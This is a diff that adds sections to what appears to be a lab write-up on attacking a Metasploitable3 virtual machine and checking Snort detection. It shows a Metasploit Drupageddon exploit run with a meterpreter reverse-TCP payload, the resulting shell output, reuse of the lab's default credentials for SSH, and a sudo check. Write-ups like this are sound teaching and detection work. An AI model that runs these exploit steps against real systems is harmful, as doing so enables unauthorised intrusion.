@@ -362,6 +362,56 @@ We can also see that the attack was detected by snort as a priority 1 attack:
 11/19-15:01:03.079051  [**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:44957 -> 172.28.128.3:631
 ```
 
+## Identified Attack 3: Drupal
+
+In the second nmap scan, we saw in the port 80 that there was a folder called `drupal`. So lets search for a exploit for drupal:
+
+```bash
+search drupal
+```
+
+```bash
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
+   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+```
+
+We choose the 2 since it has an excellent rank and SQL injection seems like a good attack to try. Then we have multiple payloads to choose, I tried with different payloads and the one that worked for me was the 18 one (php/meterpreter/reverse_tcp), then the options are usual and execute.
+
+```bash
+set RHOSTS 172.28.128.3
+set TARGETURI /drupal/
+execute
+```
+
+After the execution we get a meterpreter session
+
+```bash
+[*] Started reverse TCP handler on 192.168.0.104:4444 
+[*] Sending stage (39927 bytes) to 192.168.0.104
+FATAL:  terminating connection due to administrator command
+[*] Meterpreter session 7 opened (192.168.0.104:4444 -> 192.168.0.104:54896) at 2023-11-19 23:24:17 +0200
+
+meterpreter > getuid
+Server username: www-data
+```
+
+snort detected the attack:
+
+```bash
+[**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:43547 -> 172.28.128.3:80
+```
+
 ## Missed Attack 1: PHPMyAdmin
 
 When we access the page `172.28.128.3` from the browser we can see that there is a phpmyadmin page, we can search for a exploit which we can use.
@@ -432,5 +482,13 @@ Although these passwords are hashed we will keep them in case we need them later
 Lastly we will access the database `payroll` and table `users` which contains usernames, first names, last names, plain text passwords and salaries. We can see that if we try these users in the `payroll_app.php` we can login with all of them and see the information.
 
 We tried to login to the machine by ssh with the credentials of the table and all of them worked and we could get a shell, but Leia, Luke, and Han had sudo privileges. (`han_solo:nerf_herder`, `luke_skywalker:like_my_father_beforeme`, `leia_organa:help_me_obiwan`).
+
+Check that Leia has root
+
+```bash
+leia_organa@metasploitable3-ub1404:~$ id
+uid=1111(leia_organa) gid=100(users) groups=100(users),27(sudo)
+
+```
 
 This is not detected by Snort.
